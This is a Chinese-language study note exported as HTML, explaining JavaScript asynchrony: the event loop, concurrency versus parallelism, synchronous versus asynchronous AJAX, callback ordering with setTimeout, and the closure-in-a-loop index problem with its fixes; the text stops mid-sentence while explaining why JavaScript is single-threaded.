<html>
<head>
  <title>8 - EventLoop 、AJAX、异步编程</title>
  <basefont face="微软雅黑" size="2" />
  <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
  <meta name="exporter-version" content="YXBJ Windows/606060 (zh-CN, DDL); Windows/10.0.0 (Win64); EDAMVersion=V2;"/>
  <style>
    body, td {
      font-family: 微软雅黑;
      font-size: 10pt;
    }
  </style>
</head>
<body>
<a name="810"/>
<h1>8 - EventLoop 、AJAX、异步编程</h1>

<div>
<span><div><div><div><div><div><span style="font-size: 14pt; font-weight: bold;">异步（</span><span style="font-size: 14pt;"><span style="font-size: 14pt; font-weight: bold;">asynchronous 简称 async</span></span><span style="font-size: 14pt; font-weight: bold;">）</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">callback =&gt; jquery的 $.ajax() =&gt; </span><span style="font-size: 12pt;">jquery的</span> <span style="font-size: 12pt;">$.Defferd() $.when() =&gt; Promise =&gt;</span> <span style="font-size: 12pt;">fetch =&gt; </span><span style="font-size: 12pt;">Generator </span><span style="font-size: 12pt;">=&gt;  </span><span style="font-size: 12pt;">async 和 await  </span><span style="font-size: 12pt;">=&gt;  axios </span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">JS 本身就是单线程，没有多线程一说，不可能出现多个 JS 线程，所以不存在并行，即便是异步，JS 也是单线程（JS 引擎线程）</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">因为浏览器是多线程的，所以异步只不过是将函数放在浏览器的其他线程。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: unset; font-family: unset; font-weight: bold;">并发与并行的区别</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">串行：你吃饭吃到一半，电话来了，你一直到吃完了以后才去接，这就说明你不支持并发也不支持并行。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">并发：你吃饭吃到一半，电话来了，你停了下来接了电话，接完后继续吃饭，这说明你支持并发。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">并行：你吃饭吃到一半，电话来了，你一边打电话一边吃饭，这说明你支持并行。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: unset; font-family: unset;">并发的关键是你有处理多个任务的能力，不一定要同时。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">并行的关键是你有同时处理多个任务的能力。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">区分它们</span><span style="font-size: 12pt;">最关键的点就是：是否是『同时』。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">并发和并行的区别，</span><span style="font-size: 12pt; font-weight: bold;">还有一个比喻</span><span style="font-size: 12pt; font-weight: bold;">是：一个人同时吃三个馒头（并不是吃完一个再去吃另一个）和三个人同时吃三个馒头。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">并行必须多核 CPU 才能办到，并发单核就可以做到。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">并行：举个栗子，一个 4 核 8 线程的计算机，</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">同时有 8 个程序运行，每个程序占用一个线程，那么现在可以说这 8 个程序是并行的，同时走的。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">并发：如果程序超过8个，超过的程序会停住吗？</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">例如播放音乐和打字，难道我要打字完成了才能播放音乐?</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">或者音乐播放完成了，我才能打字。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">不，CPU 是以时间片轮询的方式，来执行的，</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">就是等你打字的时候，偷偷去放音乐，</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: unset; font-family: unset;">放音乐的时候可以让你偷偷地打字，你却感觉不到卡顿</span><span style="font-size: 12pt; color: unset; font-family: unset;">或者感觉不到音乐会不流畅，</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: unset; font-family: unset;">因为 CPU 速度太快了，已经超过了你的感知范围。所以把这种程序交替运行叫做并发。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">串行、并发与并行</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">串行：喂？你在做什么呢？买菜啊？好的，到家了说一声。啊？到家了？那你到幼儿园接娃吧。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">串行的特点：前一个任务没搞定，下一个任务就只能等着。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">并行：来，这是你的盖浇饭，这是我的胡辣汤。咱俩一起吃。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">并行的特点：两个任务在同一时刻互不干扰的同时执行。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">并发：你去买个菜，顺路把邮件发了；路过幼儿园时带娃回家。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">并发的特点：同时安排若干个任务，这些任务可以彼此穿插着进行，</span><span style="font-size: 12pt;">并发允许两个任务彼此干扰</span><span style="font-size: 12pt;">。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">JavaScript有一个基于事件循环的并发模型。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/EventLoop" style="font-size: 12pt;">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/EventLoop</a></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-family: unset; font-weight: bold;">实现异步的最核心原理就是：将 callback 作为参数传递给异步执行的函数，当有结果返回之后再触发 callback 执行</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">异步与回调并没有直接的联系，回调只是异步的一种实现方式（再次重复，加深理解）。</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">异步的实现方式：</span></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;">1、回调函数</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">2、事件监听</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">3、Promise</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">4、</span><span style="font-size: 12pt;">发布</span><span style="font-size: 12pt;">/订阅</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><a href="https://www.ruanyifeng.com/blog/2012/12/asynchronous%EF%BC%BFjavascript.html" style="font-size: 12pt;">https://www.ruanyifeng.com/blog/2012/12/asynchronous%EF%BC%BFjavascript.html</a></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">异步最大的优点：</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">可以同时进行多个操作，优化用户体验，如输入用户名密码，同时验证用户名密码。</span></span></span></div><div><br/></div><div><span style="font-size: 12pt;">异步函数通常具有以下的形式：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">A(args..., callbackFn)</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">A 可以叫做异步过程的发起函数，或者叫做异步任务注册函数。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">args 是这个函数需要的参数。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">callbackFn 也是这个函数的参数，但是它比较特殊，所以单独列出来。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">所以，从主线程的角度看，一个异步过程包括下面两个要素：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 发起函数(或叫注册函数) A</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">● 回调函数 callbackFn</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">例如：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">setTimeout(fn, 1000);</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">其中的 setTimeout 就是异步过程的发起函数，fn是回调函数。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">A(args..., callbackFn) 只是一种抽象的表示，并不代表回调函数一定要作为发起函数的参数，例如：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">var xhr = new XMLHttpRequest();</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">xhr.onreadystatechange = xxx; // 添加回调函数</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">xhr.open('GET', url);</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">xhr.send(); // 发起函数</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">发起函数和回调函数就是分离的。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">同步（</span><span style="font-size: 12pt; font-weight: bold;">synchronous</span><span style="font-size: 12pt; font-weight: bold;">）</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">同步就是程序按</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">顺序执行，同一时刻只能执行一件事。</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-family: unset; font-weight: bold;">例如，一个函数依赖于另一个函数的结果，它就只能等待那个函数结束才能继续执行。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">后面一行代码必须等待前面一行代码执行，</span><span style="font-size: 12pt;">后一个任务等待前一个任务结束，然后再执行，程序的执行顺序与任务的排列顺序是一致的、同步的（阻塞的）。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">单核 CPU 也可以并发执行多个任务，靠的是 CPU 自身频繁的切换调度，并不是真正的并行，</span></div><div><br/></div><div><span style="font-size: 12pt;">所以两个耗时 5s 的任务，在单核下，无论是来回切换执行，还是顺序执行，最终的耗时一定都是 10s。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">在计算机普遍都有多核 CPU 的时代，坐在那里等待毫无意义，</span><span style="font-size: 12pt;">异步可以在另一个 CPU 内核上干其他的事，计算机完成这个耗时任务后再通知你。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">异步（a</span><span style="font-size: 12pt; font-weight: bold;">synchronous）</span></div><div><br/></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">异步行为是为了优化因计算量大而时间长的操作，</span></span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">如果在函数 A 返回的时候，调用者还不能够得到预期结果，而是需要在将来通过一定的手段得到，那么这个函数就是异步的。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">每一个任务有一个或多个回调函数（callback），前一个任务结束后，不是执行后一个任务，而是执行回调函数，</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">后一个任务则是不等前一个任务结束就执行，所以程序的执行顺序与任务的排列顺序是不一致的、异步的。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">异步：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">你烧壶水要冲咖啡，可是水要10分钟才能烧开，此时，你转身去写了个小程序，等10分钟后水好了，才回来冲咖啡，</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">中间你去做了很多别的有意义的事情，也并没有耽</span><span style="font-size: 12pt;">误冲咖啡这项任务，这就是异步。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">同步：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">你烧壶水要冲咖啡，可是水要10分钟才能烧开，此时，你就等啊等啊等，等了10分钟水好了，才继续冲咖啡的活动，中间的过程就是等待，啥都不干，这就是同步。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">下面以AJAX请求为例，来看一下同步和异步的区别：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">异步 AJAX：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">● 主线程：“你好，AJAX线程。请你帮我发个HTTP请求吧，我把请求地址和参数都给你了。”</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> AJAX线程：“好的，主线程。我马上去发，但可能要花点儿时间呢，你可以先去忙别的。”</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">● </span><span style="font-size: 12pt;">主线程：：“谢谢，你拿到响应后告诉我一声啊。”</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">(接着，主线程做其他事情去了。一顿饭的时间后，它收到了响应到达的通知。)</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">同步 AJAX：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 主线程：“你好，AJAX线程。请你帮我发个HTTP请求吧，我把请求地址和参数都给你了。”</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> AJAX线程：“......”</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 主线程：：“喂，AJAX线程，你怎么不说话？”</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> AJAX线程：“......”</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 主线程：：“喂！喂喂喂！”</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">● </span><span style="font-size: 12pt;">AJAX线程：“......”</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"> (一炷香的时间后)</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 主线程：：“喂！求你说句话吧！”</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> AJAX线程：“主线程，不好意思，我在工作的时候不能说话。你的请求已经发完了，拿到响应数据了，给你。”</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">异步编程就是为了让程序在一个时间内做更多的事情，</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">加速软件的运转</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">JavaScript是一种同步的、阻塞的、单线程的语言，在这种语言中，一次只能执行一个操作。</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">但 web 浏览器定义了函数和 API，允许我们当某些事件发生时不是按照同步的方式，而是异步地调用函数(比如，需要时间，用户通过鼠标的交互，或者获取到网络数据)。</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">这意味着代码可以同时做几件事情，而不需要停止或阻塞主线程。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3.jpg" type="image/jpeg" data-filename="3.jpg" width="846"/></div><div><span style="font-size: 12pt;">先打印100，再打印300，过一秒后打印200。setTimeout是异步，异步不阻塞代码执行，等待但不会卡住。</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [1].jpg" type="image/jpeg" data-filename="3.jpg" width="848"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [2].jpg" type="image/jpeg" data-filename="3.jpg" width="639"/></div><div><br/></div><div><span style="font-size: 12pt;">先打印100，等你确认（你一秒后确认就是一秒后）才执行下面的代码。alert是同步，同步会阻塞</span><span style="font-size: 12pt;">代码执行，会卡住。</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [3].jpg" type="image/jpeg" data-filename="3.jpg" width="726"/></div><div><br/></div><div><span style="font-size: 12pt;">打印的结果是1、3、5、2、4</span></div><div><br/></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">开发中比较常用的异步操作有（异步宏任务）：</span></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">●</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;"> 网络请求，如 ajax 的HTTP请求、动态&lt;img&gt;和动态&lt;script&gt;加载</span></div><div><font color="#7600D8" style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">● 定时函数，如 setTimeout setInterval</span></span></div><div><font color="#7600D8" style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">● </span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">事件绑定，如 addEventListener （注意：手动添加代码去触发事件是同步的）</span></div><div><font color="#7600D8" style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">●</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;"> IO 操作，如 readFile readdir</span></div><div><font color="#FF0000" style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">以上都是异步任务</span></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [4].jpg" type="image/jpeg" data-filename="3.jpg" width="848"/></div><div><br/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [5].jpg" type="image/jpeg" data-filename="3.jpg" width="862"/></div><div><br/></div><div><span style="font-size: 12pt;">先打印start，再打印end，最后</span><span style="font-size: 12pt;">等待获取到data1.json后才</span><span style="font-size: 12pt;">打印data1。</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [6].jpg" type="image/jpeg" data-filename="3.jpg" width="666"/></div><div><br/></div><div><span style="font-size: 12pt;">先打印start，再打印end，最后等待图片加载完毕才打印loaded。</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [7].jpg" type="image/jpeg" data-filename="3.jpg" width="918"/></div><div><br/></div><div><span style="font-size: 12pt;">先打印start，再打印end，最后</span><span style="font-size: 12pt;">等待触发点击事件后才打印clicked</span><span style="font-size: 12pt;">。</span></div><div><br/></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">案例1</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">var a = 1;</span></div><div><span style="font-size: 12pt;">funciton f() {</span></div><div><span style="font-size: 12pt;">    console.log(a); // 2</span></div><div><span style="font-size: 12pt;">}</span></div><div><span style="font-size: 12pt;">a = 2;</span></div><div><span style="font-size: 12pt;">f.call();</span></div></div><div><br/></div><div><span style="font-size: 12pt;">console.log(a)比</span><span style="font-size: 12pt;">a = 2晚执行</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">案例2</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">var i = 2;</span></div><div><span style="font-size: 12pt;">setTimeout(function () {</span></div><div><span style="font-size: 12pt;">     console.log(i); // 6</span></div><div><span style="font-size: 12pt;">})</span></div><div><span style="font-size: 12pt;">i = 6;</span></div></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">点击 li 获取索引</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">// 选取6个li元素</span></div><div><span style="font-size: 12pt;">var lis = document.querySelectorAll('li'); </span></div><div><span style="font-size: 12pt;">for (var i = 0; i &lt; lis.length; i++) {</span></div><div><span style="font-size: 12pt;">    lis[i].onclick = function () {</span></div><div><span style="font-size: 12pt;">        console.log(i); // 每次点击都打印6 用户可以在一个小时后点击，结果一样</span></div><div><span style="font-size: 12pt;">    }</span></div><div><span style="font-size: 12pt;">}</span></div><div><span style="font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco;">// for循环结束之后i就是6 </span></div><div><span style="font-size: 12pt;">console.log(i); // 6</span></div></div><div><br/></div><div><span style="font-size: 12pt;">延迟函数的回调会在循环结束时才执行。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><font color="#FF0000" style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">事实上，当定时器运行时即使每个迭代中执行的是setTimeout(..., 0)，所有的回调函数依然是在循环结束后才会被执行，因此会每次输出一个6出来。</span></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">这里引伸出一个更深入的问题，代码中到底有什么缺陷导致它的行为同语义所暗示的不一致呢？</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><font color="#FF0000" style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">缺陷是我们试图假设循环中的每个迭代在运行时都会给自己“捕获”一个 i 的副本。</span></font></div><div><font color="#FF0000" style="font-size: 12pt;"><br/></font></div><div><font color="#FF0000" style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">但是根据作用域的工作原理，实际情况是尽管循环中的五个函数是在各个迭代中分别定义的，但是它们都被封闭在一个共享的全局作用域中，因此实际上只有一个 i 。</span></font></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">解决方案：</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">1、使用自定义属性和this（推荐）</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">// 选取6个li元素</span></div><div><span style="font-size: 12pt;">var list = document.querySelectorAll('li');</span></div><div><span style="font-size: 12pt;">for (var i = 0; i &lt; list.length; i++) {</span></div><div><span style="font-size: 12pt;">    var li = list[i];</span></div><div><span style="font-size: 12pt;">    li.index = i;</span></div><div><span style="font-size: 12pt;">    li.onclick = function () {</span></div><div><span style="font-size: 12pt;">        console.log(this.index); // 打印对应的索引</span></div><div><span style="font-size: 12pt;">    }</span></div><div><span style="font-size: 12pt;">}</span></div><div><span style="font-size: 12pt;">// for循环结束之后i就是6</span></div><div><span style="font-size: 12pt;">console.log(i); // 6</span></div></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">2、使用闭包</span></div><div><br/></div><div><span style="font-size: 12pt;">我们需要更多的闭包作用域，特别是在循环的过程中每个迭代都需要一个闭包作用域。</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">// 选取6个li元素</span></div><div><span style="font-size: 12pt;">var list = document.querySelectorAll('li');</span></div><div><span style="font-size: 12pt;">for (var i = 0; i &lt; list.length; i++) {</span></div><div><span style="font-size: 12pt;">    var li = list[i];</span></div><div><span style="color: rgb(51, 51, 51); font-family: Monaco;"><font style="font-size: 12pt;">       (function (i) {</font></span></div><div><font style="font-size: 12pt;"><span style="color: rgb(51, 51, 51); font-family: Monaco;">           </span>  li.onclick = function () {</font></div><div><font style="font-size: 12pt;">            console.log(i); // 打印对应的索引</font></div><div><font style="font-size: 12pt;">        }</font></div><div><span style="color: rgb(51, 51, 51); font-family: Monaco;"><font style="font-size: 12pt;">        }) (i);</font></span></div><div><span style="font-size: 12pt;">}</span></div><div><span style="font-size: 12pt;">// for循环结束之后i就是6</span></div><div><font style="font-size: 12pt;">console.log(i); // 6</font></div></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">在迭代内使用IIFE会为每个迭代都生成一个新的作用域，使得延迟函数的回调可以将新的作用域封闭在每个迭代内部，每个迭代中都会含有一个具有正确值的变量供我们访问。</span></div><div><br/></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">3、使用 let i 代替for循环的 var i</span></font></div><div><br/></div><div><br/></div><hr/><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">异步机制是如何工作的：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; color: rgb(255, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;">JavaScript是单线程的，同一时刻只允许执行一条语句，一个代码块，也就是同一时间只能做一件事</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [8].jpg" type="image/jpeg" data-filename="3.jpg" width="769"/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">单线程原因：避免与 DOM 渲染冲突</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">如果 JavaScript 同时有两个线程，一个线程在某个 DOM 节点上添加内容，另一个线程删除了这个节点，这时浏览器应该以哪个线程为准？</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">所以，为了避免复杂性，从一诞生，JavaScript 就是单线程，这已经成了这门语言的核心特征，将来也不会改变。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">由于 JS 是可以操作 DOM 的，如果同时修改元素属性并同时渲染界面(即 JS 线程 和 